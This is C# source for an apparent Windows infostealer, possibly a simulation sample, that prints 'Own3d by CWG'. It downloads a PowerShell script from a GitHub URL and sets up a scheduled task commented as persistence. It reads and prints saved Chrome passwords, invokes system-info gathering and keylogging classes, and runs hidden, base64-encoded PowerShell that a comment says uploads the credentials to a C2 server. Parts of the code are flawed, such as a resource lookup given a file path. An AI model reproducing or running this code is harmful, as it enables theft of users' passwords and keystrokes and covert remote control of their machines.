using System;
using System.Diagnostics;
using Microsoft.Win32.TaskScheduler;
using System.IO;
using System.Collections.Generic;
using BrowserPass;
using System.Net;

namespace cwg.sourcePEwithPS
{
    class Program
    {
        internal static WebClient webClient;

        static void DownloadFile(string url, string savePath)
        {
            WebClient client = new WebClient();
            client.DownloadFile(url, savePath);
            Console.ReadLine();
        }

        public static byte[] ExtractResource(string filename)
        {
            var resourceName = $"{typeof(Program).Assembly.GetName().Name?.Replace("-", "_")}.{filename}";

           var stream = System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName);

            if (stream == null)
            {
                return Array.Empty<byte>();
            }

            var ba = new byte[stream.Length];

            stream.Read(ba, 0, ba.Length);

            return ba;
        }

        static void CreateTask()
        {
            var ts = new TaskService();

            // Create a new task definition and assign properties
            TaskDefinition td = ts.NewTask();
            td.RegistrationInfo.Description = "Run task everyday";

            // Create a trigger that will fire the task at this time every other day
            td.Triggers.Add(new DailyTrigger { DaysInterval = 2 });

            // Create an action that will launch Notepad whenever the trigger fires
            td.Actions.Add(new ExecAction("notepad.exe", "c:\\test.log", null));

            // Register the task in the root folder
            ts.RootFolder.RegisterTaskDefinition(@"Test", td);

            // Remove the task we just created
            ts.RootFolder.DeleteTask("Test");
        }


        static void Main(string[] args)
        {
            Console.WriteLine($"Own3d by CWG on {DateTime.Now}");

            //create temp directory for file
            string tempPath = "c:\\Temp";
            bool exists = System.IO.Directory.Exists(tempPath);
            if (!exists)
                System.IO.Directory.CreateDirectory(tempPath);

            //download powershell file
            string url = "https://github.com/nurajbihari/cwg/blob/master/src/cwg.sourcePEwithPS/sourcePS.ps1";
            string savePath = @"C:\Temp\sourcePS.ps1";
            DownloadFile(url, savePath);

            //create a scheduled task for persistence
            CreateTask();

            //Read Chrome Passsword
            ChromePassReader chromeReader = new ChromePassReader();

            //display chrome passwords
            var chromePass = chromeReader.ReadPasswords();
            Console.WriteLine("Hahahahahahaha got your passwords!");

            foreach (var pass in chromePass)
            {
                Console.WriteLine("URL:      " + pass.Url + "\n");
                Console.WriteLine("Username: " + pass.Username + "\n");
                Console.WriteLine("Password: " + pass.Password + "\n");
            }

            var psCommandBase64 = Convert.ToBase64String(ExtractResource(@"c:\temp\sourcePS.ps1"));

            //capture system Info
            GatherInfo sysInfo = new GatherInfo();

            //Capture User Input
            KeyLogging logUser = new KeyLogging();

            //Use PS to upload chrome credentials to c2
            var startInfo = new ProcessStartInfo()
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -ExecutionPolicy unrestricted -EncodedCommand {psCommandBase64}",
                UseShellExecute = false,
                CreateNoWindow = true
            };

            Process.Start(startInfo);
        }
    }
}